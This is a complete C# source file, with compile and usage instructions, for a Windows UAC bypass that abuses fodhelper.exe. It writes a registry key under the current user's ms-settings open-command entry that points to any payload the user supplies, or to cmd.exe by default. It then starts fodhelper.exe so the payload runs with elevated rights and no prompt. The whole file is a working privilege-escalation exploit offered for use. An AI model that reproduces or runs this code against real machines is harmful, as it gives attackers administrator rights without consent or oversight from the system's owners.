/*
Created by: Julio Ureña (plaintext)
Twitter: @JulioUrena
Website: https://plaintext.do

Compile: csc.exe uac_bypass_fodhelper.cs
Usage: uac_bypass_fodhelper.exe C:\Path\To\Payload.exe
*/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using Microsoft.Win32;
using System.Diagnostics;

namespace UAC_Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // Payload to be executed
            Console.WriteLine("[+] Starting Bypass UAC.");

            string payload = "";

            if (args.Length > 0)
            {
                payload = args[0];
                Console.WriteLine(@"[+] Payload to be Executed " + payload);
            }
            else
            {
                Console.WriteLine("[+] No Payload specified. Executing cmd.exe.");
                payload = @"C:\Windows\System32\cmd.exe";
            }

            try
            {
                // Registry Key Modification
                Microsoft.Win32.RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                key.SetValue("", payload, RegistryValueKind.String);
                key.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                key.Close();
                 
                Console.WriteLine("[+] Registry Key Changed.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Modify the registry Key.");
                Console.WriteLine("[-] Exit.");
            }
			
			//Wait 5 sec before execution
            Console.WriteLine("[+] Waiting 5 seconds before execution.");
            System.Threading.Thread.Sleep(5000);
			
            // Trigger the UAC Bypass 
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = @"/c start fodhelper.exe";
                Process.Start(startInfo);

                Console.WriteLine("[+] UAC Bypass Application Executed.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Execute the Application fodhelper.exe to perform the bypass.");
                DeleteKey();
                Console.WriteLine("[-] Exit.");

            }

            
        }

        static void DeleteKey()
        {
            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command");

                // Validate if the Key was created
                if (rkey != null)
                {
                    try
                    {
                        Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings\shell\open\command");
                    }
                    catch
                    {
                        Console.WriteLine(@"[-] Unable to the Registry key (Software\Classes\ms-settings\shell\open\command).");
                    }
                }

                Console.WriteLine("[+] Registry Cleaned.");
                //return true;
            }
            catch
            {
                Console.WriteLine("[-] Unable to Clean the Registry.");
                //return false;
            }
        }
    }
}
